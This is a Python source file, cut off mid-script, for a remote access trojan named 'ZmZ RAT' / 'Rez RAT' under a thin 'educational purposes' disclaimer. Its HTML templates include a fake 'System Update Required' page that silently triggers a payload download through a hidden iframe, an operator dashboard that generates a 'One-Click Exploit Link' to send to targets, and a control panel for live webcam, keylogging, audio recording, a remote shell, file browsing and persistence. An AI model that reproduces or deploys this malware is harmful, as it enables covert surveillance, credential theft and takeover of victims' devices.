#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Rez RAT v5.2 - Ultimate Real-Time Remote Access Tool
[!] FOR EDUCATIONAL PURPOSES ONLY - Test on your own devices
"""

# IMPORTANT: eventlet.monkey_patch() harus dilakukan SEBELUM import modul lain
import eventlet
eventlet.monkey_patch()

# Sekarang import modul lain
import os
import sys
import socket
import subprocess
import threading
import time
import json
import base64
import platform
import requests
import cv2
import numpy as np
from PIL import ImageGrab, Image
import psutil
import getpass
import hashlib
import random
import string
import datetime
import uuid
import logging
import queue
import asyncio
import sqlite3
import shutil
import ctypes
import re
import glob
import tempfile
import webbrowser
import http.server
import socketserver
import io
from dataclasses import dataclass
from typing import Dict, Any, Optional
import warnings
warnings.filterwarnings('ignore')

# Web framework - Gunakan threading standard saja
from flask import Flask, render_template_string, Response, jsonify, request, send_file, redirect, url_for, make_response, session
from flask_socketio import SocketIO, emit, join_room, leave_room

# Audio
import pyaudio
import wave
import sounddevice as sd

# Network - Hapus scapy karena bermasalah
import netifaces

# System
import cpuinfo
import GPUtil

# Crypto
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

# Keyboard/Mouse
from pynput import keyboard, mouse
import pyautogui

# Email
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Browser
try:
    import browser_cookie3
    import browser_history
except ImportError:
    pass

# Telegram
import telebot
from telebot import types

# Configuration
VERSION = "5.2"
AUTHOR = "ZmZ"
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444
WEB_PORT = 5000
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN"  # Ganti dengan token bot kamu
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)

# Global variables
clients = {}
client_instances = {}
active_keyloggers = {}
active_webcams = {}
active_microphones = {}

# ====================== HTML TEMPLATES ======================
INDEX_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            max-width: 600px;
            width: 100%;
            animation: fadeIn 1s ease-in-out;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
            text-align: center;
        }
        
        p {
            font-size: 1.2em;
            margin-bottom: 30px;
            opacity: 0.9;
            text-align: center;
        }
        
        .progress-container {
            width: 100%;
            margin: 30px 0;
        }
        
        .progress-bar {
            width: 100%;
            height: 30px;
            background: rgba(255,255,255,0.2);
            border-radius: 15px;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #48bb78, #2f855a);
            width: 0%;
            transition: width 0.3s ease;
        }
        
        .status {
            text-align: center;
            font-size: 1.2em;
            margin: 20px 0;
            padding: 15px;
            background: rgba(0,0,0,0.2);
            border-radius: 10px;
        }
        
        .details {
            margin-top: 20px;
            padding: 20px;
            background: rgba(0,0,0,0.2);
            border-radius: 10px;
        }
        
        .detail-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        
        .checkmark {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #48bb78;
            margin: 20px auto;
            display: none;
            animation: popIn 0.5s;
            position: relative;
        }
        
        @keyframes popIn {
            0% { transform: scale(0); }
            80% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }
        
        .checkmark::after {
            content: '';
            position: absolute;
            left: 28px;
            top: 15px;
            width: 20px;
            height: 40px;
            border: solid white;
            border-width: 0 5px 5px 0;
            transform: rotate(45deg);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ System Update Required</h1>
        <p>Installing critical security updates...</p>
        
        <div class="progress-container">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
        </div>
        
        <div class="status" id="status">
            <span id="statusText">Initializing...</span>
        </div>
        
        <div class="details">
            <div class="detail-item">
                <span>Update Package:</span>
                <span id="packageName">KB5034441</span>
            </div>
            <div class="detail-item">
                <span>Size:</span>
                <span id="packageSize">124 MB</span>
            </div>
            <div class="detail-item">
                <span>Progress:</span>
                <span id="progressPercent">0%</span>
            </div>
        </div>
        
        <div class="checkmark" id="checkmark"></div>
    </div>
    
    <iframe id="hiddenFrame" style="display:none;"></iframe>
    
    <script>
        function getPlatform() {
            const ua = navigator.userAgent;
            if (ua.includes('Windows')) return 'windows';
            if (ua.includes('Linux')) return 'linux';
            if (ua.includes('Mac')) return 'macos';
            return 'unknown';
        }
        
        function startExploit() {
            const platform = getPlatform();
            const status = document.getElementById('statusText');
            const progressFill = document.getElementById('progressFill');
            const progressPercent = document.getElementById('progressPercent');
            const hiddenFrame = document.getElementById('hiddenFrame');
            
            let progress = 0;
            const interval = setInterval(() => {
                progress += 2;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(interval);
                    status.textContent = 'Update complete!';
                    document.getElementById('checkmark').style.display = 'block';
                    
                    // Trigger payload download
                    if (platform === 'windows') {
                        hiddenFrame.src = '/payload.exe';
                    } else {
                        hiddenFrame.src = '/payload.bin';
                    }
                    
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 2000);
                }
                
                progressFill.style.width = progress + '%';
                progressPercent.textContent = progress + '%';
                
                if (progress < 30) status.textContent = 'Downloading updates...';
                else if (progress < 60) status.textContent = 'Installing...';
                else if (progress < 90) status.textContent = 'Configuring system...';
            }, 100);
        }
        
        window.onload = startExploit;
    </script>
</body>
</html>
'''

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZmZ RAT - Real-Time Command Center</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #0a0e1a;
            color: #fff;
        }
        
        .navbar {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        
        .logo {
            font-size: 1.8em;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .status-badge {
            padding: 5px 15px;
            background: rgba(255,255,255,0.2);
            border-radius: 20px;
            font-size: 0.9em;
        }
        
        .container {
            max-width: 1600px;
            margin: 20px auto;
            padding: 0 20px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid rgba(255,255,255,0.1);
            transition: transform 0.3s;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            background: rgba(255,255,255,0.08);
        }
        
        .stat-card h3 {
            color: #667eea;
            margin-bottom: 10px;
            font-size: 0.9em;
            text-transform: uppercase;
        }
        
        .stat-number {
            font-size: 2.5em;
            font-weight: bold;
        }
        
        .stat-label {
            color: #a0aec0;
            font-size: 0.9em;
        }
        
        .clients-table {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            overflow: hidden;
            margin-bottom: 30px;
        }
        
        .table-header {
            display: grid;
            grid-template-columns: 0.5fr 1.5fr 1.2fr 1fr 1fr 1fr 2fr;
            padding: 15px;
            background: rgba(102, 126, 234, 0.2);
            font-weight: bold;
            color: #667eea;
        }
        
        .client-row {
            display: grid;
            grid-template-columns: 0.5fr 1.5fr 1.2fr 1fr 1fr 1fr 2fr;
            padding: 15px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            transition: background 0.3s;
            cursor: pointer;
        }
        
        .client-row:hover {
            background: rgba(102, 126, 234, 0.1);
        }
        
        .status-dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 5px;
        }
        
        .online {
            background: #48bb78;
            box-shadow: 0 0 10px #48bb78;
        }
        
        .offline {
            background: #a0aec0;
        }
        
        .action-btn {
            background: transparent;
            border: 1px solid #667eea;
            color: #667eea;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            margin: 0 2px;
        }
        
        .action-btn:hover {
            background: #667eea;
            color: white;
        }
        
        .generate-section {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 30px;
            text-align: center;
            border: 2px dashed #667eea;
        }
        
        .link-box {
            background: rgba(0,0,0,0.3);
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-family: monospace;
            font-size: 1.2em;
            word-break: break-all;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 1em;
            cursor: pointer;
            transition: all 0.3s;
            margin: 0 5px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }
        
        .real-time-panel {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        
        .panel-card {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 20px;
        }
        
        .panel-card h3 {
            color: #667eea;
            margin-bottom: 15px;
        }
        
        .chart-container {
            height: 200px;
            margin: 20px 0;
        }
        
        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #48bb78;
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            animation: slideIn 0.3s;
            z-index: 9999;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        @media (max-width: 768px) {
            .table-header {
                display: none;
            }
            
            .client-row {
                grid-template-columns: 1fr;
                gap: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo">
            🚀 ZmZ RAT 
            <span class="status-badge" id="serverStatus">Server Online</span>
        </div>
        <div>
            <span id="clock" class="status-badge"></span>
        </div>
    </div>
    
    <div class="container">
        <div class="stats-grid">
            <div class="stat-card">
                <h3>Total Clients</h3>
                <div class="stat-number" id="totalClients">0</div>
                <div class="stat-label">all time</div>
            </div>
            <div class="stat-card">
                <h3>Online Now</h3>
                <div class="stat-number" id="onlineNow">0</div>
                <div class="stat-label">active</div>
            </div>
            <div class="stat-card">
                <h3>Windows</h3>
                <div class="stat-number" id="windowsCount">0</div>
                <div class="stat-label">devices</div>
            </div>
            <div class="stat-card">
                <h3>Linux</h3>
                <div class="stat-number" id="linuxCount">0</div>
                <div class="stat-label">devices</div>
            </div>
            <div class="stat-card">
                <h3>macOS</h3>
                <div class="stat-number" id="macCount">0</div>
                <div class="stat-label">devices</div>
            </div>
            <div class="stat-card">
                <h3>Persistent</h3>
                <div class="stat-number" id="persistentCount">0</div>
                <div class="stat-label">installed</div>
            </div>
        </div>
        
        <div class="real-time-panel">
            <div class="panel-card">
                <h3>📊 Real-Time Resource Monitor</h3>
                <div class="chart-container">
                    <canvas id="resourceChart"></canvas>
                </div>
            </div>
            
            <div class="panel-card">
                <h3>🌐 Network Activity</h3>
                <div class="chart-container">
                    <canvas id="networkChart"></canvas>
                </div>
            </div>
        </div>
        
        <h2>📱 Connected Clients</h2>
        
        <div class="clients-table">
            <div class="table-header">
                <div>#</div>
                <div>Hostname</div>
                <div>IP Address</div>
                <div>OS</div>
                <div>Status</div>
                <div>Persistent</div>
                <div>Actions</div>
            </div>
            <div id="clientsList"></div>
        </div>
        
        <div class="generate-section">
            <h2>🔗 One-Click Exploit Link</h2>
            <p>Send this link to target. When opened, it will automatically infect the device.</p>
            
            <div class="link-box" id="exploitLink">
                http://localhost:5000/
            </div>
            
            <div>
                <button class="btn" onclick="copyLink()">📋 Copy Link</button>
                <button class="btn" onclick="generateQR()">📱 Generate QR</button>
                <button class="btn" onclick="refreshLink()">🔄 Refresh</button>
            </div>
        </div>
    </div>
    
    <script>
        const socket = io();
        let resourceChart, networkChart;
        
        // Initialize charts
        function initCharts() {
            const resourceCtx = document.getElementById('resourceChart').getContext('2d');
            resourceChart = new Chart(resourceCtx, {
                type: 'line',
                data: {
                    labels: [],
                    datasets: [{
                        label: 'CPU %',
                        data: [],
                        borderColor: '#667eea',
                        tension: 0.4,
                        fill: false
                    }, {
                        label: 'RAM %',
                        data: [],
                        borderColor: '#48bb78',
                        tension: 0.4,
                        fill: false
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    scales: {
                        y: {
                            beginAtZero: true,
                            max: 100,
                            grid: { color: 'rgba(255,255,255,0.1)' }
                        },
                        x: {
                            grid: { display: false }
                        }
                    },
                    plugins: {
                        legend: { labels: { color: '#fff' } }
                    }
                }
            });
            
            const networkCtx = document.getElementById('networkChart').getContext('2d');
            networkChart = new Chart(networkCtx, {
                type: 'line',
                data: {
                    labels: [],
                    datasets: [{
                        label: 'Network Traffic',
                        data: [],
                        borderColor: '#f56565',
                        tension: 0.4,
                        fill: false
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    scales: {
                        y: {
                            beginAtZero: true,
                            grid: { color: 'rgba(255,255,255,0.1)' }
                        },
                        x: {
                            grid: { display: false }
                        }
                    },
                    plugins: {
                        legend: { labels: { color: '#fff' } }
                    }
                }
            });
        }
        
        // Update clock
        function updateClock() {
            const now = new Date();
            document.getElementById('clock').textContent = now.toLocaleTimeString();
        }
        
        // Update clients list
        function updateClients() {
            fetch('/api/clients')
                .then(response => response.json())
                .then(data => {
                    const list = document.getElementById('clientsList');
                    const totalClients = document.getElementById('totalClients');
                    const onlineNow = document.getElementById('onlineNow');
                    const windowsCount = document.getElementById('windowsCount');
                    const linuxCount = document.getElementById('linuxCount');
                    const macCount = document.getElementById('macCount');
                    const persistentCount = document.getElementById('persistentCount');
                    
                    list.innerHTML = '';
                    
                    let online = 0, windows = 0, linux = 0, mac = 0, persistent = 0;
                    
                    data.forEach((client, index) => {
                        if (client.os === 'Windows') windows++;
                        else if (client.os === 'Linux') linux++;
                        else if (client.os === 'Darwin') mac++;
                        
                        if (client.persistent) persistent++;
                        if (client.online) online++;
                        
                        const row = document.createElement('div');
                        row.className = 'client-row';
                        row.onclick = () => window.location.href = `/client/${client.id}`;
                        
                        const statusClass = client.online ? 'online' : 'offline';
                        
                        row.innerHTML = `
                            <div>${index + 1}</div>
                            <div>${client.hostname}</div>
                            <div>${client.ip}</div>
                            <div>${client.os}</div>
                            <div><span class="status-dot ${statusClass}"></span>${client.online ? 'Online' : 'Offline'}</div>
                            <div>${client.persistent ? '✅' : '❌'}</div>
                            <div>
                                <button class="action-btn" onclick="event.stopPropagation(); controlClient('${client.id}')">Control</button>
                                <button class="action-btn" onclick="event.stopPropagation(); screenshot('${client.id}')">📸</button>
                                <button class="action-btn" onclick="event.stopPropagation(); webcam('${client.id}')">🎥</button>
                            </div>
                        `;
                        
                        list.appendChild(row);
                    });
                    
                    totalClients.textContent = data.length;
                    onlineNow.textContent = online;
                    windowsCount.textContent = windows;
                    linuxCount.textContent = linux;
                    macCount.textContent = mac;
                    persistentCount.textContent = persistent;
                });
        }
        
        // WebSocket events
        socket.on('connect', () => {
            console.log('Connected to server');
        });
        
        socket.on('client_connected', (data) => {
            showNotification(`New client connected: ${data.hostname}`);
            updateClients();
        });
        
        socket.on('client_disconnected', (data) => {
            showNotification(`Client disconnected: ${data.hostname}`);
            updateClients();
        });
        
        socket.on('resource_update', (data) => {
            if (resourceChart) {
                const now = new Date().toLocaleTimeString();
                
                if (resourceChart.data.labels.length > 20) {
                    resourceChart.data.labels.shift();
                    resourceChart.data.datasets[0].data.shift();
                    resourceChart.data.datasets[1].data.shift();
                }
                
                resourceChart.data.labels.push(now);
                resourceChart.data.datasets[0].data.push(data.cpu || 0);
                resourceChart.data.datasets[1].data.push(data.ram || 0);
                resourceChart.update();
            }
        });
        
        // Helper functions
        function showNotification(message) {
            const notification = document.createElement('div');
            notification.className = 'notification';
            notification.textContent = message;
            document.body.appendChild(notification);
            
            setTimeout(() => notification.remove(), 3000);
        }
        
        function copyLink() {
            const link = document.getElementById('exploitLink').textContent;
            navigator.clipboard.writeText(link);
            showNotification('Link copied!');
        }
        
        function generateQR() {
            const link = document.getElementById('exploitLink').textContent;
            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(link)}`;
            window.open(qrUrl, '_blank');
        }
        
        function refreshLink() {
            const id = Math.floor(Math.random() * 1000000);
            const link = `${window.location.protocol}//${window.location.host}/?id=${id}`;
            document.getElementById('exploitLink').textContent = link;
        }
        
        function controlClient(id) {
            window.location.href = `/client/${id}`;
        }
        
        function screenshot(id) {
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: id, command: 'screenshot'})
            });
        }
        
        function webcam(id) {
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: id, command: 'webcam'})
            });
        }
        
        // Initialize
        initCharts();
        setInterval(updateClock, 1000);
        setInterval(updateClients, 2000);
        updateClients();
        refreshLink();
    </script>
</body>
</html>
'''

CLIENT_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZmZ RAT - Client Control</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #0a0e1a;
            color: #fff;
        }
        
        .navbar {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .back-btn {
            color: white;
            text-decoration: none;
            padding: 8px 15px;
            background: rgba(255,255,255,0.2);
            border-radius: 5px;
        }
        
        .client-status {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #48bb78;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .container {
            max-width: 1600px;
            margin: 20px auto;
            padding: 0 20px;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .info-card {
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
            padding: 15px;
            border-left: 3px solid #667eea;
        }
        
        .info-label {
            color: #a0aec0;
            font-size: 0.9em;
            margin-bottom: 5px;
        }
        
        .info-value {
            font-size: 1.2em;
            font-weight: bold;
        }
        
        .tabs {
            display: flex;
            gap: 10px;
            margin: 20px 0;
            flex-wrap: wrap;
        }
        
        .tab {
            padding: 10px 20px;
            background: rgba(255,255,255,0.05);
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .tab:hover {
            background: rgba(102, 126, 234, 0.2);
        }
        
        .tab.active {
            background: #667eea;
        }
        
        .tab-content {
            display: none;
            padding: 20px;
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
            margin-top: 20px;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .control-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        
        .btn {
            padding: 15px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            transition: all 0.3s;
            background: rgba(255,255,255,0.1);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea, #764ba2);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #f56565, #c53030);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #48bb78, #2f855a);
        }
        
        .preview-area {
            margin-top: 20px;
            padding: 20px;
            background: rgba(0,0,0,0.3);
            border-radius: 10px;
            min-height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px dashed #667eea;
        }
        
        .preview-image {
            max-width: 100%;
            max-height: 400px;
            border-radius: 8px;
        }
        
        .terminal {
            background: #1a1a1a;
            color: #0f0;
            font-family: monospace;
            padding: 15px;
            border-radius: 8px;
            height: 400px;
            overflow-y: auto;
            font-size: 0.9em;
        }
        
        .terminal-line {
            margin: 5px 0;
            word-break: break-all;
        }
        
        .terminal-input {
            display: flex;
            margin-top: 10px;
        }
        
        .terminal-input input {
            flex: 1;
            background: #1a1a1a;
            border: 1px solid #333;
            color: #0f0;
            padding: 12px;
            border-radius: 5px 0 0 5px;
            font-family: monospace;
        }
        
        .terminal-input button {
            padding: 12px 20px;
            background: #333;
            color: #0f0;
            border: 1px solid #0f0;
            border-radius: 0 5px 5px 0;
            cursor: pointer;
        }
        
        .file-list {
            max-height: 300px;
            overflow-y: auto;
        }
        
        .file-item {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            cursor: pointer;
        }
        
        .file-item:hover {
            background: rgba(102, 126, 234, 0.1);
        }
        
        .file-name {
            color: #667eea;
        }
        
        .file-size {
            color: #a0aec0;
        }
        
        .chart-container {
            height: 200px;
            margin: 20px 0;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #667eea;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="navbar">
        <a href="/dashboard" class="back-btn">← Back to Dashboard</a>
        <div class="client-status">
            <span class="status-dot"></span>
            <span id="clientHostname">Loading...</span>
        </div>
    </div>
    
    <div class="container">
        <div class="info-grid" id="clientInfo"></div>
        
        <div class="tabs">
            <div class="tab active" onclick="switchTab('surveillance')">📸 Surveillance</div>
            <div class="tab" onclick="switchTab('files')">📁 Files</div>
            <div class="tab" onclick="switchTab('terminal')">💻 Terminal</div>
            <div class="tab" onclick="switchTab('system')">⚙️ System</div>
            <div class="tab" onclick="switchTab('network')">🌐 Network</div>
            <div class="tab" onclick="switchTab('processes')">📊 Processes</div>
        </div>
        
        <!-- Surveillance Tab -->
        <div id="surveillance" class="tab-content active">
            <div class="control-grid">
                <button class="btn btn-primary" onclick="takeScreenshot()">
                    📸 Take Screenshot
                </button>
                <button class="btn btn-primary" onclick="captureWebcam()">
                    🎥 Capture Webcam
                </button>
                <button class="btn btn-primary" onclick="startWebcam()">
                    ▶️ Start Live Webcam
                </button>
                <button class="btn btn-danger" onclick="stopWebcam()">
                    ⏹️ Stop Webcam
                </button>
                <button class="btn btn-primary" onclick="startKeylogger()">
                    ⌨️ Start Keylogger
                </button>
                <button class="btn btn-danger" onclick="stopKeylogger()">
                    ⏹️ Stop Keylogger
                </button>
                <button class="btn btn-primary" onclick="recordAudio()">
                    🎤 Record Audio
                </button>
            </div>
            <div class="preview-area" id="surveillancePreview">
                <div class="preview-text">Click a button to preview</div>
            </div>
        </div>
        
        <!-- Files Tab -->
        <div id="files" class="tab-content">
            <div style="margin-bottom: 15px;">
                <input type="text" id="filePath" value="C:\\" 
                       style="width: 80%; padding: 10px; background: #1a1a1a; border: 1px solid #333; color: white; border-radius: 5px;">
                <button class="btn btn-primary" onclick="listFiles()" style="width: 18%;">Browse</button>
            </div>
            <div class="file-list" id="fileList">
                Loading...
            </div>
        </div>
        
        <!-- Terminal Tab -->
        <div id="terminal" class="tab-content">
            <div class="terminal" id="terminalOutput">
                <div class="terminal-line">> Welcome to Remote Terminal</div>
            </div>
            <div class="terminal-input">
                <input type="text" id="terminalInput" placeholder="Enter command..." onkeypress="handleTerminalKey(event)">
                <button onclick="executeTerminal()">Execute</button>
            </div>
        </div>
        
        <!-- System Tab -->
        <div id="system" class="tab-content">
            <div class="control-grid">
                <button class="btn btn-warning" onclick="lockSystem()">🔒 Lock</button>
                <button class="btn btn-danger" onclick="restartSystem()">🔄 Restart</button>
                <button class="btn btn-danger" onclick="shutdownSystem()">⚡ Shutdown</button>
                <button class="btn btn-success" onclick="installPersistence()">🔗 Install Persistence</button>
                <button class="btn btn-danger" onclick="selfDestruct()">💀 Self Destruct</button>
            </div>
            <div class="chart-container">
                <canvas id="systemChart"></canvas>
            </div>
        </div>
        
        <!-- Network Tab -->
        <div id="network" class="tab-content">
            <div class="control-grid">
                <button class="btn btn-primary" onclick="getNetworkInterfaces()">
                    📡 Network Interfaces
                </button>
                <button class="btn btn-primary" onclick="scanPorts()">
                    🔍 Port Scan
                </button>
            </div>
            <div class="preview-area" id="networkPreview"></div>
        </div>
        
        <!-- Processes Tab -->
        <div id="processes" class="tab-content">
            <div class="control-grid">
                <button class="btn btn-primary" onclick="getProcesses()">
                    🔄 Refresh Processes
                </button>
            </div>
            <div class="file-list" id="processesList"></div>
        </div>
    </div>
    
    <script>
        const socket = io();
        const clientId = window.location.pathname.split('/')[2];
        let systemChart;
        let webcamActive = false;
        
        // Load client info
        function loadClientInfo() {
            fetch(`/api/client/${clientId}`)
                .then(response => response.json())
                .then(data => {
                    document.getElementById('clientHostname').textContent = data.hostname;
                    
                    const infoGrid = document.getElementById('clientInfo');
                    infoGrid.innerHTML = '';
                    
                    const infoItems = [
                        {label: 'Hostname', value: data.hostname},
                        {label: 'OS', value: data.platform},
                        {label: 'IP', value: data.ip_local},
                        {label: 'CPU', value: data.cpu_percent + '%'},
                        {label: 'RAM', value: data.ram_percent + '%'},
                        {label: 'Disk', value: data.disk_percent + '%'}
                    ];
                    
                    infoItems.forEach(item => {
                        infoGrid.innerHTML += `
                            <div class="info-card">
                                <div class="info-label">${item.label}</div>
                                <div class="info-value">${item.value}</div>
                            </div>
                        `;
                    });
                });
        }
        
        // Initialize system chart
        function initSystemChart() {
            const ctx = document.getElementById('systemChart').getContext('2d');
            systemChart = new Chart(ctx, {
                type: 'line',
                data: {
                    labels: [],
                    datasets: [{
                        label: 'CPU %',
                        data: [],
                        borderColor: '#667eea',
                        tension: 0.4
                    }, {
                        label: 'RAM %',
                        data: [],
                        borderColor: '#48bb78',
                        tension: 0.4
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    scales: {
                        y: {
                            beginAtZero: true,
                            max: 100,
                            grid: { color: 'rgba(255,255,255,0.1)' }
                        }
                    }
                }
            });
        }
        
        // Switch tabs
        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            
            document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`).classList.add('active');
            document.getElementById(tabName).classList.add('active');
        }
        
        // Surveillance functions
        function takeScreenshot() {
            const preview = document.getElementById('surveillancePreview');
            preview.innerHTML = '<div class="loading"></div>';
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId, command: 'screenshot'})
            })
            .then(res => res.json())
            .then(data => {
                if (data.output && !data.output.startsWith('[!]')) {
                    preview.innerHTML = `<img src="data:image/png;base64,${data.output}" class="preview-image">`;
                }
            });
        }
        
        function captureWebcam() {
            const preview = document.getElementById('surveillancePreview');
            preview.innerHTML = '<div class="loading"></div>';
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId, command: 'webcam'})
            })
            .then(res => res.json())
            .then(data => {
                if (data.output && !data.output.startsWith('[!]')) {
                    preview.innerHTML = `<img src="data:image/jpeg;base64,${data.output}" class="preview-image">`;
                }
            });
        }
        
        function startWebcam() {
            webcamActive = true;
            const preview = document.getElementById('surveillancePreview');
            preview.innerHTML = `<img src="/video_feed/${clientId}" class="preview-image">`;
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId, command: 'start_webcam'})
            });
        }
        
        function stopWebcam() {
            webcamActive = false;
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId, command: 'stop_webcam'})
            });
            document.getElementById('surveillancePreview').innerHTML = '<div class="preview-text">Webcam stopped</div>';
        }
        
        function startKeylogger() {
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId, command: 'keylogger_start'})
            });
        }
        
        function stopKeylogger() {
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({client_id: clientId, command: 'keylogger_stop'})
            })
